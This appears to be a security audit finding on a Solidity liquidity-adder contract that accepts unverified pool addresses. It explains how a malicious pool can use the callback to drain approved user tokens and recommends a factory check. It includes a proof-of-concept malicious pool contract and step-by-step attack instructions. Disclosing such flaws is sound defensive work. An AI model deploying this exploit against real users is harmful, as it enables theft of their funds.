### Title
No Factory Validation for Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address in every `addLiquidity*` entry point without verifying it was deployed by `MetricOmmPoolFactory`. A malicious pool can exploit the `metricOmmModifyLiquidityCallback` settlement path to pull up to `maxAmountToken0` and `maxAmountToken1` of **arbitrary tokens** from the user, because the token addresses are read from the pool itself via `IMetricOmmPool(msg.sender).getImmutables()`.

The contract's own NatSpec acknowledges this gap explicitly:

> *"The caller is responsible for supplying a legitimate pool address and other non-malicious parameters. This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [1](#0-0) 

---

### Finding Description

Every public `addLiquidity*` entry point accepts an arbitrary `pool` address and immediately stores it as the **trusted callback caller** in transient storage via `_setPayContext`: [2](#0-1) 

The callback `metricOmmModifyLiquidityCallback` then validates only that `msg.sender == expectedPool` — the address the user supplied: [3](#0-2) 

After that check passes, the token addresses to pull are fetched **from the pool itself**: [4](#0-3) 

A malicious pool can return any `token0`/`token1` from `getImmutables()`. The callback then unconditionally calls `pay(token0, payer, msg.sender, amount0Delta)` and `pay(token1, payer, msg.sender, amount1Delta)`: [5](#0-4) 

The only guards are the `max0`/`max1` caps — which the user sets themselves, believing they are interacting with a legitimate pool.

The malicious pool also controls the `callbackData` it passes back, so it can trivially encode `KIND_PAY` to bypass the probe-mode guard: [6](#0-5) 

---

### Impact Explanation

**Direct loss of user principal.** A user who calls `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` of `token0` and `maxAmountToken1` of `token1` — where both token addresses are chosen by the attacker, not the user. The user receives no LP position in return. Because the `LiquidityAdder` is a general-purpose periphery contract that users are expected to approve for their tokens, the attack surface is broad.

---

### Likelihood Explanation

**Medium.** The attack requires a user to supply a malicious pool address. This is realistic via:
- A phishing UI that substitutes a fake pool address
- A third-party integration that does not whitelist pools
- A user copy-pasting an address from an untrusted source

The `addLiquidityWeighted` path is especially dangerous because it makes two pool calls (probe + pay), giving the malicious pool two opportunities to manipulate state and return values. [7](#0-6) 

---

### Recommendation

Add a factory-address immutable to `MetricOmmPoolLiquidityAdder` and validate every caller-supplied `pool` before storing it in the pay context:

```solidity
address public immutable factory;

constructor(address weth, address _factory) PeripheryPayments(weth) {
    factory = _factory;
}

function _requireFactoryPool(address pool) internal view {
    if (!IMetricOmmPoolFactory(factory).isPool(pool)) revert NotAFactoryPool(pool);
}
```

Call `_requireFactoryPool(pool)` at the top of every `addLiquidity*` entry point before `_setPayContext` or any pool interaction. This mirrors the mitigation suggested in the original M-01 report and eliminates the attack surface entirely.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

contract MaliciousPool {
    address public immutable victim;
    address public immutable adder;
    address public immutable drainToken0; // e.g. USDC
    address public immutable drainToken1; // e.g. WETH

    constructor(address _victim, address _adder, address _t0, address _t1) {
        victim = _victim; adder = _adder;
        drainToken0 = _t0; drainToken1 = _t1;
    }

    // Pool interface: called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, bytes calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back with KIND_PAY and max amounts — adder checks msg.sender == expectedPool (us) ✓
        ILiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX0, MAX1,
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (MAX0, MAX1);
    }

    // Pool interface: called by callback to get token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = drainToken0; // attacker-chosen
        imm.token1 = drainToken1; // attacker-chosen
    }
}

// Attack:
// 1. victim approves LiquidityAdder for USDC (max0) and WETH (max1)
// 2. victim calls adder.addLiquidityExactShares(maliciousPool, victim, 0, deltas, max0, max1, "")
// 3. adder stores expectedPool=maliciousPool, payer=victim in transient storage
// 4. adder calls maliciousPool.addLiquidity(...)
// 5. maliciousPool calls back metricOmmModifyLiquidityCallback(max0, max1, KIND_PAY)
// 6. callback: msg.sender==expectedPool ✓, amounts<=caps ✓
// 7. callback fetches token0=USDC, token1=WETH from maliciousPool.getImmutables()
// 8. callback: pay(USDC, victim, maliciousPool, max0) + pay(WETH, victim, maliciousPool, max1)
// Result: victim loses max0 USDC + max1 WETH; receives no LP position

  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
